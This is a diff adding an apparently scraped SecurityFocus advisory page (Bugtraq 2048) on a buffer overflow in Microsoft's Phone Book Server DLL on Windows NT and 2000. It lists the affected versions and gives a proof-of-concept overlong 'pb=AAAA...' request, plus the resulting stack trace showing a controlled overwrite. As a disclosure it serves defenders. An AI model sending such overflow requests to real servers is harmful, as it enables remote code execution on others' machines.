@@ -1,0 +1,222 @@
+#SpeeDr00t@Black Falcon<br>#bid2048<p><b><span style="font-size: 18pt;">Microsoft PhoneBook Server Buffer Overflow</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2048/info">info</a><br><a href="http://www.securityfocus.com/bid/2048/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2048/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2048/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2048/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2048
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 04 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 04 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was discovered by Alberto Solino of CORE SDI, Buenos Aires, Argentina.
+
+ Other CORE SDI advisories can be obtained from: http://www.core-sdi.com/publications.html
+
+ It was also discovered and reported independently at the same time by Da
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft Windows NT Server  4.0 SP6a<br/>
+<span class="related">
+						
+							+ 
+						
+						Avaya DefinityOne Media Servers  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya DefinityOne Media Servers  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya IP600 Media Servers  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya IP600 Media Servers  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya S3400 Message Application Server  0<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya S8100 Media Servers  0<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya S8100 Media Servers  0<br/>
+</span>
+					
+				
+					Microsoft Windows NT Server  4.0 SP6<br/>
+					
+				
+					Microsoft Windows NT Server  4.0 SP5<br/>
+					
+				
+					Microsoft Windows NT Server  4.0 SP4<br/>
+					
+				
+					Microsoft Windows NT Server  4.0 SP3<br/>
+					
+				
+					Microsoft Windows NT Server  4.0 SP2<br/>
+					
+				
+					Microsoft Windows NT Server  4.0 SP1<br/>
+					
+				
+					Microsoft Windows NT Server  4.0<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP6a<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP6<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP5<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
+					
+				
+					Microsoft Windows NT Enterprise Server  4.0<br/>
+					
+				
+					Microsoft Windows 2000 Server  SP1<br/>
+					
+				
+					Microsoft Windows 2000 Server  <br/>
+<span class="related">
+						
+							+ 
+						
+						Avaya DefinityOne Media Servers  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya IP600 Media Servers  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya S3400 Message Application Server  0<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Avaya S8100 Media Servers  0<br/>
+</span>
+					
+				
+					Microsoft Windows 2000 Advanced Server  SP1<br/>
+					
+				
+					Microsoft Windows 2000 Advanced Server  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	CORE has developed a working commercial exploit for their IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.<br/><br/><br/>The Phone Book server services requests using the Internet Information Services 5.0 with URIs such as http://hostname/pbserver/<br/><br/> According to Microsoft's documentation a DLL (PBSERVER.DLL) is exported and the services can be used making requests with the following format:<br/><br/><br/><br/>http://hostname/pbserver/pbserver.dll?osarch=&amp;ostype=&amp;osver=&amp;cmver=&amp;lcid=&amp;pb<br/>ver=&amp;pb=&lt;STRING=db name&gt;<br/><br/> In the DLL checks the total lenght to ensure that request does not exceed<br/>1024 bytes, however it is<br/> possible to overflow a local variable of fixed length in the DLL by sending<br/>a request with<br/> the following form:<br/><br/> GET /pbserver/pbserver.dll?&amp;&amp;&amp;&amp;&amp;&amp;pb=AAAAAA... (less than 980 chars)<br/>HTTP/1.0\n\n<br/><br/>The result is an exception reported in the Event log with source WAM like<br/>the following:<br/><br/> The HTTP server encountered an unhandled exception while processing the<br/>ISAPI Application '<br/> + 0x41414143<br/> + 0x41414139<br/> pbserver!HttpExtensionProc + 0x1C<br/> wam!DllGetClassObject + 0x808<br/> RPCRT4!NdrServerInitialize + 0x4DB<br/> RPCRT4!NdrStubCall2 + 0x586<br/> RPCRT4!CStdStubBuffer_Invoke + 0xC1<br/> ole32!StgGetIFillLockBytesOnFile + 0x116EC<br/> ole32!StgGetIFillLockBytesOnFile + 0x12415<br/> ole32!DcomChannelSetHResult + 0xDF0<br/> ole32!DcomChannelSetHResult + 0xD35<br/> ole32!StgGetIFillLockBytesOnFile + 0x122AD<br/> ole32!StgGetIFillLockBytesOnFile + 0x1210A<br/> ole32!StgGetIFillLockBytesOnFile + 0x11E22<br/> RPCRT4!NdrServerInitialize + 0x745<br/> RPCRT4!NdrServerInitialize + 0x652<br/> RPCRT4!NdrServerInitialize + 0x578<br/> RPCRT4!RpcSmDestroyClientContext + 0x9E<br/> RPCRT4!NdrConformantArrayFree + 0x8A5<br/> RPCRT4!NdrConformantArrayFree + 0x3FC<br/> RPCRT4!RpcBindingSetOption + 0x395<br/> RPCRT4!RpcBindingSetOption + 0x18E<br/> RPCRT4!RpcBindingSetOption + 0x4F8<br/> KERNEL32!CreateFileA + 0x11B<br/> <br/>For additional information specific to this message please visit the Microsoft Online Support site located at: http://www.microsoft.com/contentredirect.asp.<br/><br/> By sending a carefully crafted HTTP request an attacker can bypass the total length check and overflow a local variable in PBSERVER.DLL allowing the execution of arbitrary code as user GUEST on the vulnerable machine.
+	
+		<ul>
+</ul>
+</div>
